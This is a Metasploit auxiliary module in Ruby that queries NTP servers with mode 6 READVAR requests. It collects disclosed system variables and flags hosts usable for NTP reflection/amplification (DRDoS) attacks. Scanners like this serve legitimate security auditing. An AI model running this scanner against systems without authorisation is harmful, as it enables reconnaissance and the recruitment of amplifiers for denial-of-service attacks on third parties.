##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

  include Msf::Auxiliary::Report
  include Msf::Exploit::Remote::Udp
  include Msf::Auxiliary::UDPScanner
  include Msf::Auxiliary::NTP
  include Msf::Auxiliary::DRDoS

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'NTP Clock Variables Disclosure',
      'Description'    => %q{
          This module reads the system internal NTP variables. These variables contain
        potentially sensitive information, such as the NTP software version, operating
        system version, peers, and more.
      },
      'Author'         => [ 'Ewerson Guimaraes(Crash) <crash[at]dclabs.com.br>' ],
      'License'        => MSF_LICENSE,
      'References'     =>
        [
          [ 'URL','http://www.rapid7.com/vulndb/lookup/ntp-clock-variables-disclosure' ],
        ]
      )
    )
  end

  # Called for each response packet
  def scanner_process(data, shost, sport)
    @results[shost] ||= []
    @results[shost] << Rex::Proto::NTP::NTPControl.new(data)
  end

  # Called before the scan block
  def scanner_prescan(batch)
    @results = {}
    @probe = Rex::Proto::NTP::NTPControl.new
    @probe.version = datastore['VERSION']
    @probe.operation = 2
  end

  # Called after the scan block
  def scanner_postscan(batch)
    @results.keys.each do |k|
      # TODO: check to see if any of the responses are actually NTP before reporting
      report_service(
        :host  => k,
        :proto => 'udp',
        :port  => rport,
        :name  => 'ntp',
        :info => @results[k].map { |r| r.payload }.join.inspect
      )

      peer = "#{k}:#{rport}"
      response_map = { @probe => @results[k] }
      vulnerable, proof = prove_amplification(response_map)
      what = 'NTP Mode 6 READVAR DRDoS'
      if vulnerable
        print_good("#{peer} - Vulnerable to #{what}: #{proof}")
        report_vuln({
          :host  => k,
          :port  => rport,
          :proto => 'udp',
          :name  => what,
          :refs  => self.references
        })
      else
        vprint_status("#{peer} - Not vulnerable to #{what}: #{proof}")
      end
    end
  end

end
